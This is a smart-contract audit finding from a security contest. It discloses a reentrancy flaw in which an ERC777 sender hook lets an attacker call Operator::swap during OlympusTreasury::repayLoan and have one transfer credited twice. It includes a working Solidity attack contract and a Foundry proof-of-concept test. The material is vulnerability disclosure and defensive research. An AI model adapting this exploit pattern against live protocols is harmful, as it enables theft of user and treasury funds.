## Tags

- bug
- 2 (Med Risk)
- sponsor confirmed
- old-submission-method

# [TRSRY: reenter from OlympusTreasury::repayLoan to Operator::swap](https://github.com/code-423n4/2022-08-olympus-findings/issues/403) 

# Lines of code

https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/TRSRY.sol#L105-L112
https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L330


# Vulnerability details

## Impact

One can repay loan to the treasury with the value from the Operator::swap

Condition:
  - the reserve token in Operator has hook for sender (like ERC777)
  - the debt is the same token as reserve

## Proof of Concept


The below code snippet shows a part of proof of concept for reentrancy attack, which is based on `src/test/policies/Operator.t.sol`. The full test code can be found [here](https://gist.github.com/zzzitron/651e1451ac1ff21be8a72b502b26f7cb), and [git diff from the `Operator.t.sol`](https://gist.github.com/zzzitron/5b8ebe635ed1939f18a100c7940b4f11).

Let's say that the reserve token implements ERC777 with the hook for the sender [(see weird erc20)](https://github.com/d-xo/weird-erc20#reentrant-calls). If the attacker can take debt of the reserve currency for the attack contract `Reenterer`, the contract can call `OlympusTreasury::repayLoan` and in the middle of repay call `Operator::swap` function. The `swap` function will modify the reserve token balance of treasury and the amount the attacker swapped will be also be used for the `repayLoan`.

In the below example, the attacker has debt of 1e18, and repays 1e17. But since the `swap` function is called in the `repayLoan`, the debt is reduced 1e17 more then it should. And the swap happened as expected so the attack has the corresponding ohm token.

```solidity
/// Mock to simulate the senders hook
/// for simplicity omitted the certain aspects like ERC1820 registry and etc.
contract MockERC777 is MockERC20 {
    constructor () MockERC20("ERC777", "777", 18) {}

    function transferFrom(address from, address to, uint256 amount) public override returns (bool) {
        _callTokenToSend(from, to, amount);
        return super.transferFrom(from, to, amount);
        // _callTokenReceived(from, to, amount);
    }

    // simplified implementation for ERC777
    function _callTokenToSend(address from, address to, uint256 amount) private {
      if (from != address(0)) {
        IERC777Sender(from).tokensToSend(from, to, amount);
      }
    }
}

interface IERC777Sender {
  function tokensToSend(address from, address to, uint256 amount) external;
}

/// Concept for an attack contract
contract Reenterer is IERC777Sender {
  ERC20 public token;
  Operator public operator;
  bool public entered;

  constructor(address token_, Operator op_) {
    token = ERC20(token_);
    operator = op_;
  }

  function tokensToSend(address from, address to, uint256 amount) external override {
    if (!entered) {
    // call swap from reenter
    // which will manipulate the balance of treasury
      entered = true;
      operator.swap(token, 1e17, 0);
    }
  }
  
  function attack(OlympusTreasury treasury) public {
    // approve to the treasury
    token.approve(address(treasury), 1e18);
    token.approve(address(operator), 100* 1e18);

    // repayDebt of 1e17
    treasury.repayLoan(token, 1e17);
  }
}
```

```solidity
/// the test
    function test_poc__reenter() public {
        vm.prank(guardian);
        operator.initialize();

      reserve.mint(address(reenterer), 1e18);
      assertEq(treasury.reserveDebt(reserve, address(reenterer)), 1e18);
      // start repayLoan
      reenterer.attack(treasury);
      // it should be 9 * 1e17 but it is 8 * 1e17
      assertEq(treasury.reserveDebt(reserve, address(reenterer)), 8*1e17);
    }
```

## Cause

The `repayLoan`, in the line 110 below,  calls the `safeTransferFrom`. The balance before and after are compared to determine how much of debt is paid. So, if the `safeTranferFrom` can modify the balance, the attacker can profit from it.

```solidity
// OlympusTreasury::repayLoan
// https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/TRSRY.sol#L105-L112
105     function repayLoan(ERC20 token_, uint256 amount_) external nonReentrant {
106         if (reserveDebt[token_][msg.sender] == 0) revert TRSRY_NoDebtOutstanding();
107
108         // Deposit from caller first (to handle nonstandard token transfers)
109         uint256 prevBalance = token_.balanceOf(address(this));
110         token_.safeTransferFrom(msg.sender, address(this), amount_);
111
112         uint256 received = token_.balanceOf(address(this)) - prevBalance;
```

In the `swap` function, if the amount in token is reserve, the payment token to buy ohm will be paid to the treasury. It gives to an opportunity to modify the balance.

```solidity
// Operator::swap
// https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L330
329             /// Transfer reserves to treasury
330             reserve.safeTransferFrom(msg.sender, address(TRSRY), amountIn_);
```

Although both of `Operator::swap` and `OlympusTreasury::repayLoan` have `nonReentrant` modifier, it does not prevent as they are two different contracts.

## Tools Used

foundry

## Recommended Mitigation Steps

The deposit logic in the `OlympusTreasury::repayLoan` was trying to handle nonstandard tokens, such as fee-on-transfer. But by doing so introduced an attack vector for tokens with ERC777. If the reserve token should be decided in the governance, it should be clarified, which token standards can be used safely.


<!-- zzzitron M00 -->



